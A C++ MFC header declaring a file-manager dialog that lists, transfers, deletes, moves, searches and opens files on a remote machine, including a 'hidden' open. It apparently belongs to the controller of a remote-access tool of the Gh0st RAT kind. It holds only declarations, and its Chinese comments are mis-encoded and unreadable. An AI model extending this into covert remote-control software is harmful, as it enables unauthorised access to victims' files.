#if !defined(AFX_FILEMANAGERDLG_H__4918F922_13A4_4389_8027_5D4993A6DB91__INCLUDED_)
#define AFX_FILEMANAGERDLG_H__4918F922_13A4_4389_8027_5D4993A6DB91__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// FileManagerDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg dialog

typedef struct {
    char SearchFileName[100];
    char SearchPath[MAX_PATH];
    BOOL bEnabledSubfolder;
} FILESEARCH;

typedef struct {
    char lpExistingFileName[MAX_PATH]; //ԭ��ַ
    char lpNewFileName[MAX_PATH]; // Ŀ��Ŀ¼
    BOOL bIsCopy;
} FILEMOVE;

typedef CList<CString, CString&> strList;

class CFileManagerDlg : public CDialog
{
// Construction
public:
    bool m_bIsStop; // ��־�Ƿ�ֹͣ���� TRUE Ϊֹͣ
    BOOL bIsLocalDlg;
    CString m_strReceiveLocalFile; // ��ǰ���ڲ���(����)�ı����ļ���
    CString m_strUploadRemoteFile; // ��ǰ���ڲ���(����)��Զ���ļ���
    void ShowProgress(); // ��ʾ����
    void SendStop();    // ����ֹͣ����������(ֹͣ���� ɾ���Ȳ���)
    int m_nTransferMode; // ���䷽ʽ
    CString m_hCopyDestFolder; // ��ק�ļ���Ŀ���ļ���
    void EndLocalRecvFile(); // ֹͣ���ؽ����ļ�
    void EndRemoteDeleteFile(); // ֹͣԶ��ɾ���ļ�
    void EndRemoteMoveFile();
    CString m_strOperatingFile; // �ļ���
    __int64 m_nOperatingFileLength; // �ļ��ܴ�С
    __int64	m_nCounter;// ������
    void WriteLocalRecvFile();
    void CreateLocalRecvFile();
    BOOL SendDownloadJob();
    BOOL SendUploadJob();
    BOOL SendDeleteJob();
    BOOL SendMoveJob();

    strList m_Remote_Download_Job;
    strList m_Remote_Upload_Job;
    strList m_Remote_Delete_Job;
    strList m_Remote_Move_Job;

    bool m_bIsCopy; // ��־�Ƿ�Ϊ���� TUREΪ���� FALSE Ϊ����

    CXTPToolBar m_wndToolBar_Local;
    CXTPToolBar m_wndToolBar_Remote;
    CXTPToolBar m_wndToolBar_Search;

//	void ShowMessage(char *lpFmt, ...);
    CString m_Local_Path;
    CString m_Remote_Path;

    BYTE m_bRemoteDriveList[1024]; // ����Զ���������б�
    CString GetParentDirectory(CString strPath);
    void OnReceiveComplete();

    CImageList* m_pImageList_Large;
    CImageList* m_pImageList_Small;

    ClientContext* m_pContext;
    CIOCPServer* m_iocpServer;
    CString m_IPAddress;

    HCURSOR m_hCursor;
    double GetDirSize(CString strFullPath);
    bool FixedUploadDirectory(LPCTSTR lpPathName);
    void FixedLocalDriveList();
    void FixedRemoteDriveList();
    void FixedLocalFileList(CString directory = "");
    void GetRemoteFileList(CString directory = "");
    void FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen);
    void FixedRemoteSearchFileList(BYTE *pbBuffer, DWORD dwBufferLen);
    HICON m_hIcon;

    CXTPStatusBar m_wndStatusBar;
    CXTPProgressCtrl* m_ProgressCtrl;
    CXTPControlComboBox* pComboSize;
    CFileManagerDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
// Dialog Data
    //{{AFX_DATA(CFileManagerDlg)
    enum { IDD = IDD_DLG_FILEMANAGER };
    CXTPComboBox 	m_Remote_Directory_ComboBox;
    CXTPComboBox 	m_Local_Directory_ComboBox;
    CXTPListCtrl	m_list_local;
    CXTPListCtrl	m_list_remote;
    CXTPListCtrl	m_list_remote_search;
    //}}AFX_DATA
    CXTPHeaderCtrl   m_headerL,m_headerS,m_headerR;


// Overrides
    // ClassWizard generated virtual function overrides
    //{{AFX_VIRTUAL(CFileManagerDlg)
public:
    virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
    virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
    virtual void PostNcDestroy();
    //}}AFX_VIRTUAL

// Implementation
protected:
    // Generated message map functions
    //{{AFX_MSG(CFileManagerDlg)
    virtual BOOL OnInitDialog();
    afx_msg HCURSOR OnQueryDragIcon();
    afx_msg void OnSize(UINT nType, int cx, int cy);
    afx_msg void OnDblclkListLocal(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnBegindragListLocal(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnBegindragListRemote(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnMouseMove(UINT nFlags, CPoint point);
    afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
    afx_msg void OnClose();
    afx_msg void OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnLocalPrev();
    afx_msg void OnRemotePrev();
    afx_msg void OnLocalView();
    afx_msg void OnLocalList();
    afx_msg void OnLocalReport();
    afx_msg void OnLocalBigicon();
    afx_msg void OnLocalSmallicon();
    afx_msg void OnRemoteBigicon();
    afx_msg void OnRemoteList();
    afx_msg void OnRemoteReport();
    afx_msg void OnRemoteSmallicon();
    afx_msg void OnRemoteView();
    afx_msg void OnUpdateLocalStop(CCmdUI* pCmdUI);
    afx_msg void OnUpdateRemoteStop(CCmdUI* pCmdUI);
    afx_msg void OnUpdateLocalPrev(CCmdUI* pCmdUI);
    afx_msg void OnUpdateRemotePrev(CCmdUI* pCmdUI);
    afx_msg void OnUpdateLocalCopy(CCmdUI* pCmdUI);
    afx_msg void OnUpdateRemoteCopy(CCmdUI* pCmdUI);
    afx_msg void OnUpdateRemoteDelete(CCmdUI* pCmdUI);
    afx_msg void OnUpdateRemoteNewfolder(CCmdUI* pCmdUI);
    afx_msg void OnUpdateLocalDelete(CCmdUI* pCmdUI);
    afx_msg void OnUpdateLocalNewfolder(CCmdUI* pCmdUI);
    afx_msg void OnRemoteCopy();
    afx_msg void OnLocalCopy();
    afx_msg void OnLocalDelete();
    afx_msg void OnRemoteDelete();
    afx_msg void OnRemoteStop();
    afx_msg void OnLocalStop();
    afx_msg void OnLocalNewfolder();
    afx_msg void OnRemoteNewfolder();
    afx_msg void OnTransfer();
    afx_msg void OnRename();
    afx_msg void OnEndlabeleditListLocal(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnEndlabeleditListRemote(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnDelete();
    afx_msg void OnNewfolder();
    afx_msg void OnRefresh();
    afx_msg void OnLocalOpen();
    afx_msg void OnRemoteOpenShow();
    afx_msg void OnRemoteOpenHide();
    afx_msg void OnRclickListLocal(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg LRESULT OnShowMessage(WPARAM wParam,LPARAM lParam); // �Զ�����Ϣ
    afx_msg LRESULT OnShowDlg(WPARAM wParam,LPARAM lParam);// �Զ�����Ϣ
    afx_msg void OnSearchResult();
    afx_msg void OnSearchStart();
    afx_msg void OnSearchStop();
    afx_msg void OnRclickListRemoteSearch(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnMenuitemOpenFilepath();
    afx_msg void OnCheckSubfolder();
    afx_msg void OnMenuitemMove();
    afx_msg void OnMenuitemCopy();
    afx_msg void OnMenuitemPaste();
    //}}AFX_MSG
    DECLARE_MESSAGE_MAP()

protected:
    CString strShowText; // ״̬��Ҫ��ʾ������

    CListCtrl* m_pDragList;		//Which ListCtrl we are dragging FROM
    CListCtrl* m_pDropList;		//Which ListCtrl we are dropping ON
    BOOL		m_bDragging;	//T during a drag operation
    int			m_nDragIndex;	//Index of selected item in the List we are dragging FROM
    int			m_nDropIndex;	//Index at which to drop item in the List we are dropping ON
    CWnd*		m_pDropWnd;		//Pointer to window we are dropping on (will be cast to CListCtrl* type)

    void DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList);
private:
    bool m_bIsUpload; // �Ƿ��ǰѱ�����������Զ���ϣ���־����λ
    bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
    void SendTransferMode();
    void SendFileData();
    void EndLocalUploadFile();
    bool DeleteDirectory(LPCTSTR lpszDirectory);
    void EnableControl(BOOL bEnable = TRUE);
    int OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl);

    void EnableSearchButtn(BOOL bEnable);
    void MoveToolBar();
    BOOL m_bOnClose;
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_FILEMANAGERDLG_H__4918F922_13A4_4389_8027_5D4993A6DB91__INCLUDED_)
